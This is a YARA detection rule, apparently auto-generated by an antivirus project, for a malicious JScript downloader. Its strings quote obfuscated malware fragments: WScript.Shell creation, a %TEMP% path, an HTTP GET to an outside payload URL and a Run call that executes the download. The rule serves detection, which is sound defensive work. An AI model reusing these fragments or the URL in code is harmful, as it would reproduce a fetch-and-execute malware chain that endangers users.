rule sig_20160427_1a89ab64e37ddfe394b5e51c3fa9d094 {
  meta:
    description = "datamaliciousorder - file 20160427_1a89ab64e37ddfe394b5e51c3fa9d094.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "878c25cc56787d6a5a7e0116237240ffa9e0d96e4b0a8d1d793d6d237525309b"

  strings:
    $s1  = "function DccycVlroq() {return AqcjzZdezl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ficg1ND" ascii
    $s2  = "function DccycVlroq() {return AqcjzZdezl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ficg1ND" ascii
    $s3  = "function EeluyWtkvb(VxdtnIofek, GaevdNcwib){FvepdKovhd = FvepdKovhd * 1; return VxdtnIofek - GaevdNcwib;};" fullword ascii
    $s4  = "var AqcjzZdezl = function MdjyvAsdwh() {return BamlvEurtz[TzjizQhenv](\"WScript\"+\".Shell\");}(), CbyxrTenqd = 11;" fullword ascii
    $s5  = "IedowAochj[EhczrJxmtz](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var BamlvEurtz = this[\"WScript\"];" fullword ascii
    $s7  = "function LghjuKkqfq(){return KfmsrSidcl + \"\";};" fullword ascii
    $s8  = "if (IedowAochj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "CdettQezzw = true; " fullword ascii
    $s10 = "function DjwowWymmr(FnqyaZeziu){AqcjzZdezl[\"R\"+\"un\"](FnqyaZeziu, FvepdKovhd, FvepdKovhd);};" fullword ascii
    $s11 = "}while (JnkjrArssy);" fullword ascii
    $s12 = "return EeluyWtkvb(VsqkcTilek, ZxrmdCfxvo);" fullword ascii
    $s13 = "function AwcyjZyvwj()" fullword ascii
    $s14 = "var CnxxtNcxyr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "var CdettQezzw = false;" fullword ascii
    $s16 = "function LxqewWksal(){return TzjizQhenv;};" fullword ascii
    $s17 = "function SgqknZeusj(XdmqkSviyg) {var RstpmCnufd = (1, 2, 3, 4, 5, XdmqkSviyg); return RstpmCnufd;};" fullword ascii
    $s18 = "YfnbpIbtqn = true;" fullword ascii
    $s19 = "var YfnbpIbtqn = false;" fullword ascii
    $s20 = "function XwphqMgypo(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}